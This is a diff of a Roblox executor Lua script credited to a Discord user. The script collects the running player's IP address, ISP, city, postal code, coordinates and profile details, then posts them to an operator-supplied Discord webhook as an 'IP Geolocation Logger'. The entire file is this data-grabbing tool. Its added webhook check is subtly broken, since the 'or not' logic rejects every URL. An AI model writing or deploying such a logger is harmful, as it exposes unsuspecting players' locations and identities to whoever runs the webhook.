@@ -1,35 +1,61 @@
 -- Credits to @mcantcode on Discord.
 local httpService = game:GetService("HttpService")
+local player = game:GetService("Players").LocalPlayer
 
-local localPlayer = game:GetService("Players").LocalPlayer
-local userId = localPlayer.UserId
+local webhookUrl = tostring(getgenv().WebhookURL)
+if not webhookUrl:match("^https://discord%.com/api/webhooks/%d+/[%w%-%_]+$") or not webhookUrl:match("^https://ptb%.discord%.com/api/webhooks/%d+/[%w%-%_]+$") then
+	return
+end
 
-local ipGeoData =  httpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
+local avatarSuccess, avatarUrl = pcall(function()
+	return httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
+end)
 
-local function addField(name, value) return { name = name, value = value or "Not found" } end
+local geoSuccess, geoData = pcall(function()
+	return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
+end)
 
-request({
-	Url = getgenv().WebhookURL,
-	Method = "POST",
-	Body = httpService:JSONEncode({
-		embeds = {
-			{ title = "Geolocation", color = 1733608, fields = {
-				addField("IP Address", ipGeoData.ip),
-				addField("Network Range", ipGeoData.network),
-				addField("ASN (Autonomous System Number)", ipGeoData.asn),
-				addField("ISP (Internet Service Provider)", ipGeoData.org),
-				addField("Country", ipGeoData.country_name),
-				addField("Region/Province", ipGeoData.region),
-				addField("City", ipGeoData.city),
-				addField("Postal Code", ipGeoData.postal),
-				addField("Latitude", tostring(ipGeoData.latitude)),
-				addField("Longitude", tostring(ipGeoData.longitude)),
-				addField("Timezone", ipGeoData.timezone)
-			}},
-			{ title = "View " .. localPlayer.Name .. "'s full profile", url = "https://www.roblox.com/users/" .. userId .. "/profile", color = 1733608, image = { url = httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl } }
-		},
-		username = "IP Geolocation Logger",
-		avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
-	}),
-	Headers = { ["Content-Type"] = "application/json" }
-})
+if not geoSuccess then
+	geoData = {}
+end
+
+local function addField(name, value)
+	return { name = name, value = tostring(geoData[value]) }
+end
+
+pcall(function()
+	(request or http_request or (http and http.request))({
+		Url = webhookUrl,
+		Method = "POST",
+		Body = httpService:JSONEncode({
+			embeds = {
+				{
+					title = "Geolocation",
+					color = 1733608,
+					fields = {
+						addField("IP Address", "ip"),
+						addField("Network Range", "network"),
+						addField("ASN (Autonomous System Number)", "asn"),
+						addField("ISP (Internet Service Provider)", "org"),
+						addField("Country", "country_name"),
+						addField("Region/Province", "region"),
+						addField("City", "city"),
+						addField("Postal Code", "postal"),
+						addField("Latitude", "latitude"),
+						addField("Longitude", "longitude"),
+						addField("Timezone", "timezone")
+					}
+				},
+				{
+					title = "View " .. player.Name .. "'s full profile",
+					url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
+					color = 1733608,
+					image = { url = avatarSuccess and avatarUrl or "https://i.ibb.co/tPYH7jS6/No-Image-Available.jpg" }
+				}
+			},
+			username = "IP Geolocation Logger",
+			avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
+		}),
+		Headers = { ["Content-Type"] = "application/json" }
+	})
+end)
